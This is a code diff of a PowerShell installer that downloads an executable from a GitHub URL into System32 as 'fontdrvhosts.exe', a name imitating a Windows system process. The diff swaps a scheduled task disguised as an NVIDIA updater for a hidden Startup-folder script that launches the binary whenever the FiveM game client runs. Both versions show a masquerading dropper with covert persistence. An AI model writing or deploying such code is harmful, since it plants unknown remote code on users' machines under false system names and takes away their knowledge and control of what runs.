@@ -17,49 +17,52 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 }
 
 # -----------------------------
-# Define paths and variables
+# Define paths
 # -----------------------------
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
+$watcherScript = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\FiveMWatcher.ps1"
 $exeUrl = "https://raw.githubusercontent.com/weewrrwr/4ealnest/main/4ealnest.exe"
-$taskName = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
 
 # -----------------------------
 # Install Mode
 # -----------------------------
 if ($choice -eq "1") {
+
     Write-Host "Starting installation..."
 
-    # Download exe
+    # Download program EXE
     Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
 
-    # Create scheduled task under CURRENT USER (NOT SYSTEM)
-    $currentUser = "$env:USERNAME"
+    # Create watcher script (auto run on Startup)
+$watcherContent = @"
+while (`$true) {
+    if (Get-Process -Name FiveM -ErrorAction SilentlyContinue) {
+        Start-Process "C:\Windows\System32\fontdrvhosts.exe"
+        break
+    }
+    Start-Sleep -Milliseconds 500
+}
+"@
 
-    $cmd = "cmd /c schtasks /create /tn `"$taskName`" /tr `"C:\Windows\System32\fontdrvhosts.exe`" /sc ONEVENT /ec Security /mo `"*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='%localappdata%\FiveM\FiveM.exe']]`" /ru `"$currentUser`" /it"
-    Invoke-Expression $cmd
+    Set-Content -Path $watcherScript -Value $watcherContent -Encoding UTF8
 
-    # Enable audit logging
-    auditpol /set /subcategory:"Process Creation" /success:enable
-
-    Write-Host "Installation completed."
+    Write-Host "Installation completed. Program will auto-run every time FiveM starts."
 }
 
 # -----------------------------
 # Clean Mode
 # -----------------------------
 elseif ($choice -eq "2") {
+
     Write-Host "Cleaning up installation..."
 
-    # Remove scheduled task
-    schtasks /delete /tn $taskName /f
-
-    # Remove files if they exist
     if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force }
+    if (Test-Path $watcherScript) { Remove-Item $watcherScript -Force }
 
     Write-Host "Cleanup completed."
 }
 
 else {
-    Write-Host "Invalid choice (please select 1 or 2)."
+    Write-Host "Invalid choice."
 }
